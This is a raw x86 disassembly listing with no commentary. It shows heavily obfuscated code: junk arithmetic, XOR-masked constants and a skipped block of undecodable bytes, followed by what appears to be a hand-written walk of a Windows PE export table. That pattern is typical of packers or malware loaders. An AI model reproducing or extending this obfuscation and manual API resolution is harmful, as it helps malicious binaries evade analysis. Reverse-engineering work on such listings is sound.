  420ed9:	mov    DWORD PTR ds:0x42824b,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x42827f
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x428167
  420eef:	sbb    eax,DWORD PTR ds:0x42831b
  420ef5:	mov    ds:0x428167,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x428217
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x42836f
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x42831f,0x0
  420f23:	mov    DWORD PTR ds:0x4282b3,0x1362
  420f2d:	mov    DWORD PTR ds:0x428263,edx
  420f33:	mov    DWORD PTR ds:0x42829f,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x428383,0xeb5
  420f48:	cmp    DWORD PTR ds:0x42831f,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428ee0
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x4281ef
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x4281fb
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x428277,ecx
  420f81:	mov    edx,DWORD PTR ds:0x42826f
  420f87:	sbb    edx,DWORD PTR ds:0x4283b7
  420f8d:	mov    DWORD PTR ds:0x42826f,edx
  420f93:	add    DWORD PTR ds:0x4281ab,ecx
  420f99:	sub    DWORD PTR ds:0x42839b,0x42830b
  420fa3:	cmp    DWORD PTR ds:0x428297,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x42837b
  420fb0:	movzx  edx,BYTE PTR ds:0x428183
  420fb7:	mov    DWORD PTR ds:0x428307,0x5580
  420fc1:	mov    DWORD PTR ds:0x4283b3,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x4283b7,0x673a
  420fd6:	cmp    DWORD PTR ds:0x428297,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428d84
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x428317
  421000:	sbb    DWORD PTR ds:0x428293,edx
  421006:	movzx  edx,WORD PTR ds:0x42816b
  42100d:	or     edx,DWORD PTR ds:0x428393
  421013:	mov    DWORD PTR ds:0x42816b,edx
  421019:	dec    DWORD PTR ds:0x428383
  42101f:	sub    DWORD PTR ds:0x42828f,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x42817b,0x0
  421048:	mov    DWORD PTR ds:0x428387,0x62d9
  421052:	mov    DWORD PTR ds:0x428167,0x300d
  42105c:	mov    DWORD PTR ds:0x42816b,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x42830f
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x42837f,0x134d
  42107b:	cmp    DWORD PTR ds:0x42817b,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428da4
  4210a1:	sbb    ecx,DWORD PTR ds:0x428293
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x4282b7,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x428173
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x42223f
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x421382
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0xa7bc:0x65828d2a
  42115b:	retf   0x7061
  42115e:	ror    DWORD PTR [edi],0x16
  421161:	sbb    cl,ch
  421163:	adc    al,0x18
  421165:	sbb    BYTE PTR [edi+0x342e3114],al
  42116b:	push   ebx
  42116c:	mov    ah,0xde
  42116e:	mov    edx,0x8e0a84ab
  421173:	sbb    esp,0x14
  421176:	ins    BYTE PTR es:[edi],dx
  421177:	push   esi
  421178:	sub    BYTE PTR [ebx],ah
  42117a:	stos   BYTE PTR es:[edi],al
  42117b:	inc    ebx
  42117c:	mov    DWORD PTR [ebp+0x6b],ebx
  42117f:	fdivr  QWORD PTR [edi+edi*8+0x6827a062]
  421186:	sbb    dl,BYTE PTR [esi]
  421188:	jno    0x4211a6
  42118a:	mov    bl,0xb2
  42118c:	mov    eax,ds:0x91c2a226
  421191:	or     BYTE PTR [edx-0x38],cl
  421194:	mov    ebx,0x41166716
  421199:	data16 adc al,0xd7
  42119c:	adc    al,0x5d
  42119e:	inc    ecx
  42119f:	loop   0x42113d
  4211a1:	and    eax,0x2c57b0ff
  4211a6:	cld    
  4211a7:	add    al,0x9c
  4211a9:	call   0xb47a:0x1f477385
  4211b0:	jb     0x421132
  4211b2:	or     eax,0xae2b47dc
  4211b7:	cmc    
  4211b8:	sti    
  4211b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ba:	pop    esi
  4211bb:	mov    bh,0x5b
  4211bd:	jo     0x4211b9
  4211bf:	adc    eax,0x85bd64f7
  4211c4:	and    al,0xe0
  4211c6:	(bad)  
  4211c7:	mov    esi,0x541c69a4
  4211cc:	adc    ecx,0xd5b42f31
  4211d2:	aad    0x1a
  4211d4:	cmp    ebx,eax
  4211d6:	mov    bh,0xca
  4211d8:	jmp    0xbdd97136
  4211dd:	cwde   
  4211de:	mov    cl,0x7f
  4211e0:	cwde   
  4211e1:	aam    0x37
  4211e3:	retf   
  4211e4:	test   BYTE PTR [ecx+eax*8],al
  4211e7:	xchg   esi,eax
  4211e8:	out    0x70,al
  4211ea:	jl     0x421242
  4211ec:	iret   
  4211ed:	push   eax
  4211ee:	dec    eax
  4211ef:	fdiv   QWORD PTR [edi-0x631f7f41]
  4211f5:	ret    
  4211f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211f7:	or     edi,DWORD PTR [eax-0x594eb58]
  4211fd:	jo     0x421246
  4211ff:	xchg   BYTE PTR [ecx],cl
  421201:	ins    BYTE PTR es:[edi],dx
  421202:	sbb    BYTE PTR [edi-0x65],dl
  421205:	xchg   BYTE PTR [edi+0x41ececc3],bh
  42120b:	mov    bh,0xba
  42120d:	rcr    BYTE PTR [ebx-0x2c37a66b],cl
  421213:	in     eax,dx
  421214:	inc    esp
  421215:	out    dx,al
  421216:	lds    esp,FWORD PTR [ebp+0x9a5d93c]
  42121c:	jne    0x42120e
  42121e:	pop    ss
  42121f:	mov    esi,0x793af368
  421224:	das    
  421225:	bound  esi,QWORD PTR [ebp+0xb]
  421228:	pop    ebp
  421229:	xor    bl,BYTE PTR ds:0xa6fbeb13
  42122f:	fs icebp 
  421231:	popa   
  421232:	fwait
  421233:	push   esi
  421234:	mov    eax,DWORD PTR [esi+0x5d3525da]
  42123a:	inc    eax
  42123b:	repnz not BYTE PTR [esi]
  42123e:	mov    eax,0x13d5c557
  421243:	push   cs
  421244:	es mov eax,0xb88321e0
  42124a:	aaa    
  42124b:	jg     0x421209
  42124d:	lods   al,BYTE PTR ds:[esi]
  42124e:	pop    ds
  42124f:	ja     0x421234
  421251:	pusha  
  421252:	push   esi
  421253:	inc    esp
  421254:	mov    bl,0xbc
  421256:	daa    
  421257:	test   dh,0x8a
  42125a:	sub    DWORD PTR [ecx-0x19],ebp
  42125d:	mov    fs,WORD PTR [ecx-0x39151794]
  421263:	or     al,0x8b
  421265:	fs (bad) 
  421267:	xchg   edi,eax
  421268:	std    
  421269:	push   0x46efd05a
  42126e:	xchg   esi,eax
  42126f:	jge    0x4212af
  421271:	push   esp
  421272:	enter  0xea3d,0xbb
  421276:	sub    DWORD PTR [edx-0x3],0x23
  42127a:	and    al,0x61
  42127c:	xor    al,0xeb
  42127e:	mov    cl,0x5f
  421280:	adc    al,cl
  421282:	div    DWORD PTR [eax]
  421284:	lock sub edx,DWORD PTR gs:[ebp+0x2c]
  421289:	mov    ch,0x76
  42128b:	inc    edi
  42128c:	outs   dx,BYTE PTR ds:[esi]
  42128d:	(bad)  
  42128e:	mov    edi,0x69ad60c6
  421293:	sar    DWORD PTR [ebp+0x0],1
  421296:	sbb    al,0x7a
  421298:	aaa    
  421299:	daa    
  42129a:	data16 sbb dl,BYTE PTR ds:0x53f8dc3b
  4212a1:	dec    esi
  4212a2:	loope  0x421236
  4212a4:	mov    ah,0x91
  4212a6:	xor    ecx,DWORD PTR [bp+si]
  4212a9:	lods   al,BYTE PTR ds:[esi]
  4212aa:	(bad)  
  4212ac:	out    0xde,al
  4212ae:	icebp  
  4212af:	iret   
  4212b0:	int3   
  4212b1:	outs   dx,DWORD PTR ds:[esi]
  4212b2:	push   edi
  4212b3:	mov    WORD PTR [esi+ebp*2-0x195859ad],cs
  4212ba:	and    dh,BYTE PTR [edx]
  4212bc:	adc    al,0xe9
  4212be:	out    0xad,al
  4212c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212c1:	jg     0x4212d8
  4212c3:	mov    bl,0x86
  4212c5:	pusha  
  4212c6:	lods   al,BYTE PTR ds:[esi]
  4212c7:	adc    dl,BYTE PTR [ebx-0x14]
  4212ca:	and    al,ah
  4212cc:	mov    eax,ds:0x869e7a87
  4212d1:	add    eax,DWORD PTR [edx+0x49]
  4212d4:	adc    DWORD PTR [esi+0x68f990bd],eax
  4212da:	mov    bl,BYTE PTR [ebx+0x7449ce32]
  4212e0:	jmp    0x42134d
  4212e2:	fwait
  4212e3:	xchg   edx,eax
  4212e4:	int    0xe1
  4212e6:	cmp    eax,0x3699d5a8
  4212eb:	lea    ebx,[eax+esi*8]
  4212ee:	inc    edx
  4212ef:	jb     0x421314
  4212f1:	mov    es,WORD PTR [ebx]
  4212f3:	stos   BYTE PTR es:[edi],al
  4212f4:	das    
  4212f5:	adc    ecx,DWORD PTR ds:0x346c26e4
  4212fb:	push   ss
  4212fc:	cwde   
  4212fd:	call   0x4d621f44
  421302:	xchg   DWORD PTR [edx],eax
  421304:	sub    BYTE PTR ds:0xc0680cfb,ah
  42130a:	popf   
  42130b:	repnz cmp BYTE PTR [edx+0x38],0x9
  421310:	cs aas 
  421312:	cmc    
  421313:	sub    eax,0x1e7f85bf
  421318:	xchg   ebp,eax
  421319:	call   0x6e72f7b6
  42131e:	test   BYTE PTR [edi+0x0],0x65
  421322:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421324:	or     eax,0x5a6cfb93
  421329:	int    0x83
  42132b:	jle    0x421336
  42132d:	adc    eax,0x817281c8
  421332:	(bad)  
  421334:	mov    ecx,0x26108ec4
  421339:	nop
  42133a:	mov    DWORD PTR [ebx+0x18],eax
  42133d:	cmp    DWORD PTR [ebx],esp
  42133f:	mov    bh,0xa
  421341:	pop    edi
  421342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421343:	enter  0xc588,0xe6
  421347:	cmp    al,0xeb
  421349:	dec    esp
  42134a:	xor    eax,0x655dc0ff
  42134f:	add    DWORD PTR [eax-0x4b9ce7ef],eax
  421355:	pop    ebx
  421356:	mov    edi,0xafc43fd0
  42135b:	push   cs
  42135c:	ja     0x421338
  42135e:	pusha  
  42135f:	push   es
  421360:	mov    ds:0xd04a070c,al
  421365:	out    dx,al
  421366:	add    BYTE PTR [ecx+0x4b361846],bl
  42136c:	mov    cl,0x46
  42136e:	pop    ecx
  42136f:	sbb    al,0x9e
  421371:	cmp    ah,BYTE PTR [esi]
  421373:	es lahf 
  421375:	xor    cl,BYTE PTR [ebp+0x5981cf91]
  42137b:	mov    al,0xa1
  42137d:	mov    ebp,0x2befb020
  421382:	mov    eax,DWORD PTR [ebp-0x15c]
  421388:	mov    edx,DWORD PTR [ebp-0x158]
  42138e:	xor    eax,0xca79a575
  421393:	xor    edx,0x9c1b89e8
  421399:	mov    cl,0x2
  42139b:	call   0x40a9b5
  4213a0:	mov    ecx,edx
  4213a2:	mov    edx,DWORD PTR [ebp-0x15c]
  4213a8:	mov    DWORD PTR [ebp-0x218],esi
  4213ae:	mov    esi,DWORD PTR [ebp-0x158]
  4213b4:	xor    edx,0xca79a575
  4213ba:	xor    esi,0x9c1b89e8
  4213c0:	mov    DWORD PTR [ebp-0x21c],eax
  4213c6:	mov    eax,edx
  4213c8:	mov    edx,esi
  4213ca:	mov    DWORD PTR [ebp-0x220],ecx
  4213d0:	mov    cl,0x3e
  4213d2:	call   0x42223f
  4213d7:	mov    esi,DWORD PTR [ebp-0x21c]
  4213dd:	or     esi,eax
  4213df:	mov    eax,DWORD PTR [ebp-0x220]
  4213e5:	or     eax,edx
  4213e7:	push   eax
  4213e8:	push   esi
  4213e9:	push   ebx
  4213ea:	push   edi
  4213eb:	call   0x416c20
  4213f0:	mov    esi,DWORD PTR [ebp-0x218]
  4213f6:	cmp    esi,eax
  4213f8:	jne    0x4214ae
  4213fe:	mov    eax,DWORD PTR [ebp-0x154]
  421404:	mov    edx,DWORD PTR [ebp-0x150]
  42140a:	xor    eax,0xca79a575
  42140f:	xor    edx,0x9c1b89e8
  421415:	mov    cl,0x2
  421417:	call   0x40a9b5
  42141c:	mov    esi,eax
  42141e:	mov    edi,edx
  421420:	mov    eax,DWORD PTR [ebp-0x154]
  421426:	mov    edx,DWORD PTR [ebp-0x150]
  42142c:	xor    eax,0xca79a575
  421431:	xor    edx,0x9c1b89e8
  421437:	mov    cl,0x3e
  421439:	call   0x42223f
  42143e:	or     esi,eax
  421440:	or     edi,edx
  421442:	mov    eax,DWORD PTR [ebp-0x15c]
  421448:	mov    edx,DWORD PTR [ebp-0x158]
  42144e:	xor    eax,0xca79a575
  421453:	xor    edx,0x9c1b89e8
  421459:	mov    cl,0x2
  42145b:	call   0x40a9b5
  421460:	mov    ebx,eax
  421462:	mov    eax,edx
  421464:	mov    ecx,DWORD PTR [ebp-0x15c]
  42146a:	mov    edx,DWORD PTR [ebp-0x158]
  421470:	xor    ecx,0xca79a575
  421476:	xor    edx,0x9c1b89e8
  42147c:	mov    DWORD PTR [ebp-0x224],eax
  421482:	mov    eax,ecx
  421484:	mov    cl,0x3e
  421486:	call   0x42223f
  42148b:	or     ebx,eax
  42148d:	mov    eax,DWORD PTR [ebp-0x224]
  421493:	or     eax,edx
  421495:	push   eax
  421496:	push   ebx
  421497:	push   edi
  421498:	push   esi
  421499:	call   0x416c20
  42149e:	mov    DWORD PTR [ebp-0x178],eax
  4214a4:	jmp    0x42176e
  4214a9:	jmp    0x421724
  4214ae:	lea    eax,[ebp-0x168]
  4214b4:	mov    DWORD PTR [ebp-0x164],eax
  4214ba:	mov    eax,DWORD PTR [ebp-0x164]
  4214c0:	mov    DWORD PTR [eax],0xa4069aae
  4214c6:	mov    eax,DWORD PTR [ebp-0x168]
  4214cc:	xor    eax,0xa4069aae
  4214d1:	shr    eax,0x2
  4214d4:	mov    ecx,DWORD PTR [ebp-0x168]
  4214da:	xor    ecx,0xa4069aae
  4214e0:	shl    ecx,0x1e
  4214e3:	or     eax,ecx
  4214e5:	mov    ecx,DWORD PTR [ebp-0x174]
  4214eb:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4214ef:	mov    DWORD PTR [ebp-0x160],eax
  4214f5:	mov    esi,DWORD PTR [ebp-0x160]
  4214fb:	mov    eax,DWORD PTR [ebp-0x154]
  421501:	mov    edx,DWORD PTR [ebp-0x150]
  421507:	xor    eax,0xca79a575
  42150c:	xor    edx,0x9c1b89e8
  421512:	mov    cl,0x2
  421514:	call   0x40a9b5
  421519:	mov    edi,eax
  42151b:	mov    ebx,edx
  42151d:	mov    eax,DWORD PTR [ebp-0x154]
  421523:	mov    edx,DWORD PTR [ebp-0x150]
  421529:	xor    eax,0xca79a575
  42152e:	xor    edx,0x9c1b89e8
  421534:	mov    cl,0x3e
  421536:	call   0x42223f
  42153b:	or     edi,eax
  42153d:	or     ebx,edx
  42153f:	mov    eax,DWORD PTR [ebp-0x15c]
  421545:	mov    edx,DWORD PTR [ebp-0x158]
  42154b:	xor    eax,0xca79a575
  421550:	xor    edx,0x9c1b89e8
  421556:	mov    cl,0x2
  421558:	call   0x40a9b5
  42155d:	mov    ecx,edx
  42155f:	mov    edx,DWORD PTR [ebp-0x15c]
  421565:	mov    DWORD PTR [ebp-0x228],esi
  42156b:	mov    esi,DWORD PTR [ebp-0x158]
  421571:	xor    edx,0xca79a575
  421577:	xor    esi,0x9c1b89e8
  42157d:	mov    DWORD PTR [ebp-0x22c],eax
  421583:	mov    eax,edx
  421585:	mov    edx,esi
  421587:	mov    DWORD PTR [ebp-0x230],ecx
  42158d:	mov    cl,0x3e
  42158f:	call   0x42223f
  421594:	mov    esi,DWORD PTR [ebp-0x22c]
  42159a:	or     esi,eax
  42159c:	mov    eax,DWORD PTR [ebp-0x230]
  4215a2:	or     eax,edx
  4215a4:	push   eax
  4215a5:	push   esi
  4215a6:	push   ebx
  4215a7:	push   edi
  4215a8:	call   0x416c20
  4215ad:	mov    esi,DWORD PTR [ebp-0x228]
  4215b3:	cmp    esi,eax
  4215b5:	je     0x42162a
  4215bb:	mov    eax,DWORD PTR [ebp-0x154]
  4215c1:	mov    edx,DWORD PTR [ebp-0x150]
  4215c7:	xor    eax,0xca79a575
  4215cc:	xor    edx,0x9c1b89e8
  4215d2:	mov    cl,0x2
  4215d4:	call   0x40a9b5
  4215d9:	mov    esi,eax
  4215db:	mov    edi,edx
  4215dd:	mov    eax,DWORD PTR [ebp-0x154]
  4215e3:	mov    edx,DWORD PTR [ebp-0x150]
  4215e9:	xor    eax,0xca79a575
  4215ee:	xor    edx,0x9c1b89e8
  4215f4:	mov    cl,0x3e
  4215f6:	call   0x42223f
  4215fb:	or     esi,eax
  4215fd:	or     edi,edx
  4215ff:	mov    eax,DWORD PTR [ebp-0x160]
  421605:	imul   esi,eax
  421608:	add    esi,DWORD PTR [ebp-0x170]
  42160e:	mov    DWORD PTR [ebp-0x16c],esi
  421614:	mov    eax,DWORD PTR [ebp-0x16c]
  42161a:	mov    DWORD PTR [ebp-0x178],eax
  421620:	jmp    0x42176e
  421625:	jmp    0x4216d5
  42162a:	mov    eax,DWORD PTR [ebp-0x154]
  421630:	mov    edx,DWORD PTR [ebp-0x150]
  421636:	xor    eax,0xca79a575
  42163b:	xor    edx,0x9c1b89e8
  421641:	mov    cl,0x2
  421643:	call   0x40a9b5
  421648:	mov    esi,eax
  42164a:	mov    edi,edx
  42164c:	mov    eax,DWORD PTR [ebp-0x154]
  421652:	mov    edx,DWORD PTR [ebp-0x150]
  421658:	xor    eax,0xca79a575
  42165d:	xor    edx,0x9c1b89e8
  421663:	mov    cl,0x3e
  421665:	call   0x42223f
  42166a:	or     esi,eax
  42166c:	or     edi,edx
  42166e:	mov    eax,DWORD PTR [ebp-0x15c]
  421674:	mov    edx,DWORD PTR [ebp-0x158]
  42167a:	xor    eax,0xca79a575
  42167f:	xor    edx,0x9c1b89e8
  421685:	mov    cl,0x2
  421687:	call   0x40a9b5
  42168c:	mov    ebx,eax
  42168e:	mov    eax,edx
  421690:	mov    ecx,DWORD PTR [ebp-0x15c]
  421696:	mov    edx,DWORD PTR [ebp-0x158]
  42169c:	xor    ecx,0xca79a575
  4216a2:	xor    edx,0x9c1b89e8
  4216a8:	mov    DWORD PTR [ebp-0x234],eax
  4216ae:	mov    eax,ecx
  4216b0:	mov    cl,0x3e
  4216b2:	call   0x42223f
  4216b7:	or     ebx,eax
  4216b9:	mov    eax,DWORD PTR [ebp-0x234]
  4216bf:	or     eax,edx
  4216c1:	push   eax
  4216c2:	push   ebx
  4216c3:	push   edi
  4216c4:	push   esi
  4216c5:	call   0x416c20
  4216ca:	mov    DWORD PTR [ebp-0x178],eax
  4216d0:	jmp    0x42176e
  4216d5:	mov    eax,DWORD PTR [ebp-0x15c]
  4216db:	mov    edx,DWORD PTR [ebp-0x158]
  4216e1:	xor    eax,0xca79a575
  4216e6:	xor    edx,0x9c1b89e8
  4216ec:	mov    cl,0x2
  4216ee:	call   0x40a9b5
  4216f3:	mov    esi,eax
  4216f5:	mov    edi,edx
  4216f7:	mov    eax,DWORD PTR [ebp-0x15c]
  4216fd:	mov    edx,DWORD PTR [ebp-0x158]
  421703:	xor    eax,0xca79a575
  421708:	xor    edx,0x9c1b89e8
  42170e:	mov    cl,0x3e
  421710:	call   0x42223f
  421715:	or     esi,eax
  421717:	or     edi,edx
  421719:	mov    DWORD PTR [ebp-0x178],esi
  42171f:	jmp    0x42176e
  421724:	mov    eax,DWORD PTR [ebp-0x15c]
  42172a:	mov    edx,DWORD PTR [ebp-0x158]
  421730:	xor    eax,0xca79a575
  421735:	xor    edx,0x9c1b89e8
  42173b:	mov    cl,0x2
  42173d:	call   0x40a9b5
  421742:	mov    esi,eax
  421744:	mov    edi,edx
  421746:	mov    eax,DWORD PTR [ebp-0x15c]
  42174c:	mov    edx,DWORD PTR [ebp-0x158]
  421752:	xor    eax,0xca79a575
  421757:	xor    edx,0x9c1b89e8
  42175d:	mov    cl,0x3e
  42175f:	call   0x42223f
  421764:	or     esi,eax
  421766:	or     edi,edx
  421768:	mov    DWORD PTR [ebp-0x178],esi
  42176e:	mov    ecx,DWORD PTR [ebp-0xd8]
  421774:	mov    eax,0x459a
  421779:	xor    edx,edx
  42177b:	div    ecx
  42177d:	mov    ecx,DWORD PTR [ebp-0xdc]
  421783:	and    eax,ecx
  421785:	add    eax,DWORD PTR [ebp-0x44]
  421788:	mov    ecx,DWORD PTR [ebp-0xe0]
  42178e:	lea    eax,[eax+ecx*1+0x272f]
  421795:	xor    eax,0x1080c
  42179a:	add    eax,DWORD PTR [ebp-0x178]
  4217a0:	mov    DWORD PTR [ebp-0xe8],eax
  4217a6:	mov    DWORD PTR [ebp-0xc],0x5950
  4217ad:	mov    DWORD PTR [ebp-0xf8],0x4964
  4217b7:	mov    DWORD PTR [ebp-0x130],0x3
  4217c1:	mov    DWORD PTR [ebp-0x20],0x2df9
  4217c8:	mov    DWORD PTR [ebp-0x8],0x4524
  4217cf:	mov    DWORD PTR [ebp-0xd4],0x637e
  4217d9:	mov    DWORD PTR [ebp-0x110],0x38c8
  4217e3:	mov    DWORD PTR [ebp-0xa4],0x7118
  4217ed:	mov    DWORD PTR [ebp-0xa0],0xaf6
  4217f7:	mov    DWORD PTR [ebp-0x10c],0x3315
  421801:	mov    eax,DWORD PTR [ebp-0xf8]
  421807:	mov    ecx,DWORD PTR [ebp-0x130]
  42180d:	xor    edx,edx
  42180f:	div    ecx
  421811:	add    eax,0x454e
  421816:	mov    ecx,DWORD PTR [ebp-0xc]
  421819:	and    eax,ecx
  42181b:	xor    eax,0x5940
  421820:	add    eax,DWORD PTR [ebp+0x8]
  421823:	mov    ecx,DWORD PTR [ebp-0x110]
  421829:	mov    edx,DWORD PTR [ebp-0xa4]
  42182f:	sub    ecx,edx
  421831:	mov    edx,DWORD PTR [ebp-0xd4]
  421837:	or     ecx,edx
  421839:	mov    edx,DWORD PTR [ebp-0x8]
  42183c:	and    ecx,edx
  42183e:	mov    edx,DWORD PTR [ebp-0x20]
  421841:	xor    ecx,edx
  421843:	mov    edx,DWORD PTR [ebp-0x10c]
  421849:	mov    esi,0x180f
  42184e:	sub    esi,edx
  421850:	mov    edx,DWORD PTR [ebp-0xa0]
  421856:	imul   esi,edx
  421859:	xor    esi,0x402b
  42185f:	xor    esi,0xfed78c17
  421865:	mov    edx,DWORD PTR [ebp-0xe8]
  42186b:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  421872:	add    ecx,eax
  421874:	add    esi,ecx
  421876:	mov    DWORD PTR [ebp-0x38],esi
  421879:	mov    DWORD PTR [ebp-0x4],0x59a8
  421880:	mov    DWORD PTR [ebp-0x30],0x7021
  421887:	mov    DWORD PTR [ebp-0xf4],0x6210
  421891:	mov    DWORD PTR [ebp-0x58],0x73d5
  421898:	mov    DWORD PTR [ebp-0x124],0x1e7d
  4218a2:	mov    DWORD PTR [ebp-0x3c],0x3144
  4218a9:	mov    eax,DWORD PTR [ebp-0x30]
  4218ac:	xor    eax,0x75cb
  4218b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4218b4:	imul   eax,ecx
  4218b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4218ba:	lea    ecx,[ecx+eax*1-0x2123b90]
  4218c1:	mov    eax,DWORD PTR [ebp-0xf4]
  4218c7:	and    eax,0x6b34
  4218cc:	and    eax,0x658d
  4218d1:	xor    edx,edx
  4218d3:	push   0x6
  4218d5:	pop    esi
  4218d6:	div    esi
  4218d8:	imul   eax,eax,0x3fb9
  4218de:	mov    edx,DWORD PTR [ebp-0x3c]
  4218e1:	and    edx,0x58c7
  4218e7:	mov    esi,DWORD PTR [ebp-0x124]
  4218ed:	or     edx,esi
  4218ef:	add    edx,0x7a25
  4218f5:	imul   edx,edx,0x28d2
  4218fb:	mov    esi,DWORD PTR [ebp-0x58]
  4218fe:	xor    edx,esi
  421900:	xor    edx,0x1856f731
  421906:	mov    esi,DWORD PTR [ebp-0xe8]
  42190c:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  421913:	add    eax,ecx
  421915:	add    edx,eax
  421917:	mov    DWORD PTR [ebp-0xac],edx
  42191d:	mov    DWORD PTR [ebp-0x54],0x1
  421924:	mov    DWORD PTR [ebp-0x40],0x1ee8
  42192b:	mov    DWORD PTR [ebp-0x1c],0x64d8
  421932:	mov    DWORD PTR [ebp-0xf0],0x5a06
  42193c:	mov    DWORD PTR [ebp-0x108],0x2eeb
  421946:	mov    DWORD PTR [ebp-0x104],0x2108
  421950:	mov    eax,DWORD PTR [ebp-0x1c]
  421953:	xor    edx,edx
  421955:	push   0x3
  421957:	pop    ecx
  421958:	div    ecx
  42195a:	mov    ecx,DWORD PTR [ebp-0x40]
  42195d:	or     eax,ecx
  42195f:	mov    ecx,DWORD PTR [ebp-0x54]
  421962:	xor    edx,edx
  421964:	div    ecx
  421966:	imul   eax,eax,0x7d53
  42196c:	mov    ecx,DWORD PTR [ebp+0x8]
  42196f:	lea    eax,[ecx+eax*1-0x1f534807]
  421976:	mov    ecx,DWORD PTR [ebp-0xf0]
  42197c:	and    ecx,0x4108
  421982:	and    ecx,0x40e7
  421988:	sub    ecx,0x1a54
  42198e:	xor    ecx,0x25ac
  421994:	mov    edx,DWORD PTR [ebp-0x104]
  42199a:	xor    edx,0x6dda
  4219a0:	mov    esi,DWORD PTR [ebp-0x108]
  4219a6:	and    edx,esi
  4219a8:	and    edx,0xe0c
  4219ae:	or     edx,0x5b
  4219b1:	mov    esi,DWORD PTR [ebp-0xe8]
  4219b7:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  4219bb:	add    ecx,eax
  4219bd:	lea    eax,[edx+ecx*1-0xc5b]
  4219c4:	mov    DWORD PTR [ebp-0xa8],eax
  4219ca:	and    DWORD PTR [ebp-0x144],0x0
  4219d1:	jmp    0x4219e3
  4219d6:	mov    eax,DWORD PTR [ebp-0x144]
  4219dc:	inc    eax
  4219dd:	mov    DWORD PTR [ebp-0x144],eax
  4219e3:	mov    eax,DWORD PTR [ebp-0xe8]
  4219e9:	mov    ecx,DWORD PTR [ebp-0x144]
  4219ef:	cmp    ecx,DWORD PTR [eax+0x18]
  4219f2:	je     0x421fab
  4219f8:	mov    eax,DWORD PTR [ebp-0x144]
  4219fe:	mov    ecx,DWORD PTR [ebp-0x38]
  421a01:	mov    edx,DWORD PTR [ebp+0x8]
  421a04:	add    edx,DWORD PTR [ecx+eax*4]
  421a07:	mov    DWORD PTR [ebp-0x48],edx
  421a0a:	mov    eax,DWORD PTR [ebp-0x48]
